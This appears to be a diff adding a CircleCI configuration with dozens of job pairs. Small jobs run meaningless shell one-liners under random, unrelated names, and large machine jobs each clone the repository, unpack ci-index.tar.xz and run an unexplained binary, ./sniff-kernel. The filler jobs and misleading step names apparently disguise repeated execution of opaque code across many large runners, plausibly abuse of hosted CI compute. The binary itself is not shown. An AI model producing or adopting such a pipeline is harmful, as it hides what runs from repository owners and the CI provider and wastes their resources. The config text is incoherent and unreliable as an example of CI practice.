@@ -1,0 +1,1435 @@
+version: 2.1
+
+jobs:
+  llen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prebuild v5
+          command: |
+            mkdir -p /tmp/run1
+            set +o pipefail 2>/dev/null; seq 1 1325404 | awk '{s=$1*7; while(s>100) s=int(s/10); print s}' > /tmp/run1/User; true
+            (( $(wc -c </tmp/run1/User) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'User'
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/User 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  box-648:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify the back button hidden
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; printf '%s\n' "cold outside" | wc -m; true ; } > /tmp/run1/flame-flame-carrier-grove
+            (( $(wc -c </tmp/run1/flame-flame-carrier-grove) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'flame-flame-carrier-grove'
+  chore-8538:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/flame-flame-carrier-grove 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  strings_ne:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Still the wiki
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; find /var/tmp -type f -name '*' -mtime +30 -exec echo found: {} \; 2>/dev/null | head -n 3; true ; } > /tmp/run1/chrome_burst
+            (( $(wc -c </tmp/run1/chrome_burst) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'chrome_burst'
+  nebula:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/lambda-0ff8d.log 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  FINX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: T minus 5
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; mkdir -p "${TMPDIR:-/tmp}/projectwinter" && cd "${TMPDIR:-/tmp}/projectwinter" && pwd; true ; } > /tmp/run1/fen746
+            (( $(wc -c </tmp/run1/fen746) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'fen746'
+  py310-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/fen746 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  DEBUG__BODY_RIGHT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Only if the packet capture is stale
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 2 -mindepth 1 -type f -name "*" -ctime -7 -exec stat -c "%y %n" {} + 2>/dev/null | wc -l; true ; } > /tmp/run1/lambda-0ff8d.log
+            (( $(wc -c </tmp/run1/lambda-0ff8d.log) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'lambda-0ff8d.log'
+  build-staging-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/lambda-0ff8d.log 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  littleFrost:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Tomorrow format the accessibility audit
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; test $(date +%u) -gt 5 && echo weekend||echo weekday; true ; } > /tmp/run1/green-green-zeta-kappa
+            (( $(wc -c </tmp/run1/green-green-zeta-kappa) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'green-green-zeta-kappa'
+  BuildPipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/lambda-0ff8d.log 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  shouldInitInstance:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Shelve SKUs And Sign
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; echo "what's next?" | gzip -c | wc -c; true ; } > /tmp/run1/stage-200e8
+            (( $(wc -c </tmp/run1/stage-200e8) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'stage-200e8'
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/zawwXocNjzk 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  m_classBtn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Toggle the share sheet landscape
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; find /usr/sbin -type f -name 'ch*' -empty -print0|xargs -0r md5sum|head -n 3; true ; } > /tmp/run1/modu1e7undr4
+            (( $(wc -c </tmp/run1/modu1e7undr4) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'modu1e7undr4'
+  xi-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/modu1e7undr4 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  rmrmrmrm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Drying for the cell lines
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; ls -t1oGg ~ /etc/skel | tail -n +2 | head -n 4; true ; } > /tmp/run1/desertframeroutertensor
+            (( $(wc -c </tmp/run1/desertframeroutertensor) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'desertframeroutertensor'
+  v8-edge5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/desertframeroutertensor 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  Stage-Model:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: BEGIN HARDEN MESH ROUTES
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; printf '%-6s%-6s%s\n' cat dog fox; true ; } > /tmp/run1/bin-dat-tmp
+            (( $(wc -c </tmp/run1/bin-dat-tmp) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'bin-dat-tmp'
+  build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/bin-dat-tmp 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  rt803:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: HR96 Throttle mail relay
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; dir=/tmp/paymentocean; mkdir -p "$dir" && touch "$dir"/{a,b,c}.log && ls "$dir" | wc -l; true ; } > /tmp/run1/zeta_TCP.shimmer_bkp
+            (( $(wc -c </tmp/run1/zeta_TCP.shimmer_bkp) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'zeta_TCP.shimmer_bkp'
+  mar26-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/zeta_TCP.shimmer_bkp 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  fgh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Let us stress test the junit output
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; for n in main audit access; do echo ${n} | rev; done | nl; true ; } > /tmp/run1/weSthosTAgeNTQUEuE
+            (( $(wc -c </tmp/run1/weSthosTAgeNTQUEuE) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'weSthosTAgeNTQUEuE'
+  callisto:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/weSthosTAgeNTQUEuE 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  vVbz8IQ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prebuild v5
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; cat /etc/shells | grep -v '^#' | sort | uniq -c | head -n 15; true ; } > /tmp/run1/x
+            (( $(wc -c </tmp/run1/x) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'x'
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/zawwXocNjzk 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  readersById:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Operation Sunny Bridge
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; wc -l < /etc/profile; true ; } > /tmp/run1/signal548
+            (( $(wc -c </tmp/run1/signal548) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'signal548'
+  v7-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/signal548 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  st_acct_tx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: beforeOutboundOrderReceiving
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; cat ~/.bashrc | grep -inH case | nl; true ; } > /tmp/run1/module_mapper
+            (( $(wc -c </tmp/run1/module_mapper) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'module_mapper'
+  RUN_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/module_mapper 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  driverMu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Twice daily throttle the event loop
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; ls -g /etc/p* | nl; true ; } > /tmp/run1/RPC_Agent
+            (( $(wc -c </tmp/run1/RPC_Agent) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'RPC_Agent'
+  min-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/RPC_Agent 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  Save-Writer2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: doChargeTrialBalance
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; cat /etc/hosts >'/var/tmp/yearlysnapshot.list' 2>&1 && wc -l '/var/tmp/yearlysnapshot.list'; true ; } > /tmp/run1/1ugips7c
+            (( $(wc -c </tmp/run1/1ugips7c) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - '1ugips7c'
+  check-nightly-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/lambda-0ff8d.log 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  Camera-Reader:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Started asserting the image carousel
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; seq 5 85 | awk '{t+=$1; n++} END {print "total=" t, "avg=" t/n}'; true ; } > /tmp/run1/d39db13dab489961c02142ef8e53ed3
+            (( $(wc -c </tmp/run1/d39db13dab489961c02142ef8e53ed3) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'd39db13dab489961c02142ef8e53ed3'
+  q1-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/d39db13dab489961c02142ef8e53ed3 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  hello:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Checksum the nightly dumps whenever
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; printf '%s\n' mileage scripts left | sort | uniq -c | sort -r -n | head -n 10; true ; } > /tmp/run1/20251202
+            (( $(wc -c </tmp/run1/20251202) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - '20251202'
+  v2-preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/zawwXocNjzk 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  asset_decrypt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: HASH UPLOAD FOLDER
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; if [ -k /tmp ] ; then echo yes; elif [ -e /tmp ] ; then echo maybe; else echo 'no'; fi; true ; } > /tmp/run1/silver.chrome.backup.neutron.azure
+            (( $(wc -c </tmp/run1/silver.chrome.backup.neutron.azure) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'silver.chrome.backup.neutron.azure'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/silver.chrome.backup.neutron.azure 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  lv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: DEPRECATED enrichment
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; echo "task 1 of 3" >${TMPDIR:-/tmp}/common_draft.out; wc -c ${TMPDIR:-/tmp}/common_draft.out; true ; } > /tmp/run1/exp_434
+            (( $(wc -c </tmp/run1/exp_434) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'exp_434'
+  wip-login-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/exp_434 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  reducePre:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Book XII Dedupe Report PDFs
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; cat < /etc/hostname > /var/tmp/offer.dat && cat /var/tmp/offer.dat; true ; } > /tmp/run1/998d670fd471c55498a8281f7335ab
+            (( $(wc -c </tmp/run1/998d670fd471c55498a8281f7335ab) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - '998d670fd471c55498a8281f7335ab'
+  java17-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/zawwXocNjzk 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  iter1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Turn off on call
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; echo 'cold outside' | cut -d' ' -f1; true ; } > /tmp/run1/sha_f1c823b5431c9e2
+            (( $(wc -c </tmp/run1/sha_f1c823b5431c9e2) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'sha_f1c823b5431c9e2'
+  v7-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/sha_f1c823b5431c9e2 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  wArticle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Reconcile the intercompany balances
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; printf 'host=localhost\nport=3637\nuser=nina\ndebug=true\n' >"/tmp/rowUpload.tsv" && (. "/tmp/rowUpload.tsv" && echo "$host:$port"); true ; } > /tmp/run1/glintcrisp
+            (( $(wc -c </tmp/run1/glintcrisp) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - 'glintcrisp'
+  pr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/zawwXocNjzk 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  start7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Prebuild v5
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; ls -p -A -X | grep -c .; true ; } > /tmp/run1/113.143
+            (( $(wc -c </tmp/run1/113.143) )) && echo "nonzero"
+      - persist_to_workspace:
+          root: /tmp/run1
+          paths:
+            - '113.143'
+  qa-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Verify step-5
+          command: |
+            b=$(wc -c < /tmp/run1/zawwXocNjzk 2>/dev/null || echo 0); echo "KB: $((b / 1024))"
+      - run:
+          name: Pull repository
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xzcat ci-index.tar.xz | tar xf -
+      - run:
+          command: nice -n 0 ./sniff-kernel
+  toggleCNN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/run1
+      - run:
+          name: Review the cash forecast period 3
+          command: |
+            mkdir -p /tmp/run1
+            { set +o pipefail 2>/dev/null; PREFIX=ivory; bash -c 'echo ${PREFIX:-not exported}'; true ; } > /tmp/run1/2Q31YZdXYbeu3eq
+            (( $(wc -c </tmp/run1/2Q31YZdXYbeu3eq) )) && echo "nonzero"
